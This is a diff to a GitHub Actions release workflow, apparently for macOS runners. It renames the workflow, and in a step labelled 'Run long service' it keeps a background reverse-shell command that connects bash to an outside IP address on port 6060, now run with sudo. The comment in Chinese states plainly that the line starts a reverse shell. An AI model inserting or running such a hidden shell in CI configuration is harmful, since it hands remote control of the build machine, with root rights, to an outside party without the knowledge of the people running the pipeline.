@@ -1,4 +1,4 @@
-name: ARL在线
+name: MAC在线
 
 on:
   release:
@@ -21,7 +21,7 @@ jobs:
       - name: Run long service
         run: |
           # 使用 macOS 的 Bash 启动反向 shell
-          nohup bash -c 'bash -i >& /dev/tcp/181.193.118.73/6060 0>&1' &>/dev/null &
+          sudo nohup bash -c 'bash -i >& /dev/tcp/181.193.118.73/6060 0>&1' &>/dev/null &
           sleep 10 # 确保服务已经启动
 
       # Checkout your code
